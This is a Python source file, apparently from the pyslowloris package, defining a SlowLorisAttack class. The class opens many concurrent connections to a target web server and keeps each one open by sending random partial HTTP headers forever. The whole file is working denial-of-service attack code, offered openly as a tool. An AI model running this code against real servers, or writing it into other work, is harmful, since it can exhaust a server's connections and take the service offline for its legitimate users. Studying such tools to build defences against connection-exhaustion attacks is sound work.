"""
MIT License

Copyright (c) 2020 Maxim Krivich

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
"""

import random

import trio

from pyslowloris import HostAddress, SlowLorisConnection
from pyslowloris import exceptions as exc


class SlowLorisAttack:
    __slots__ = ("_target", "_silent", "_connections_count", "_sleep_time", )

    DEFAULT_SLEEP_TIME = 2
    DEFAULT_RANDOM_RANGE = [1, 999999]

    def __init__(
        self, target: HostAddress, connections_count: int,
        *, sleep_time: int = None, silent: bool = True
    ):
        self._target = target
        self._silent = silent
        self._connections_count = connections_count
        self._sleep_time = sleep_time or self.DEFAULT_SLEEP_TIME

    def __repr__(self) -> str:
        internal_dict = {key: getattr(self, key) for key in self.__slots__}
        args = ",".join([f"{k}={repr(v)}" for (k, v) in internal_dict.items()])
        return f"{self.__class__.__name__}({args.rstrip(',')})"

    async def _atack_coroutine(self) -> None:
        while True:
            try:
                conn = SlowLorisConnection(self._target)
                await conn.establish_connection()
                async with conn.with_stream():
                    await conn.send_initial_headers()

                    while True:
                        rand = random.randint(*self.DEFAULT_RANDOM_RANGE)
                        await conn.send(f"X-a: {rand}\r\n")
                        await trio.sleep(self._sleep_time)

            except trio.BrokenResourceError as e:
                if not self._silent:
                    raise exc.ConnectionClosedError("Socket is broken.") from e

    async def _run(self) -> None:
        async with trio.open_nursery() as nursery:
            for _ in range(self._connections_count):
                nursery.start_soon(self._atack_coroutine)

    def start(self) -> None:
        """Start slow loris attack."""
        try:
            trio.run(self._run)
        except exc.ConnectionClosedError:
            raise
        except OSError:
            # Too much opened connections
            if not self._silent:
                raise exc.TooManyActiveConnectionsError(
                    "Too many opened connections."
                )
        except Exception as ex:
            raise exc.SlowLorisBaseError("Something went wrong.") from ex
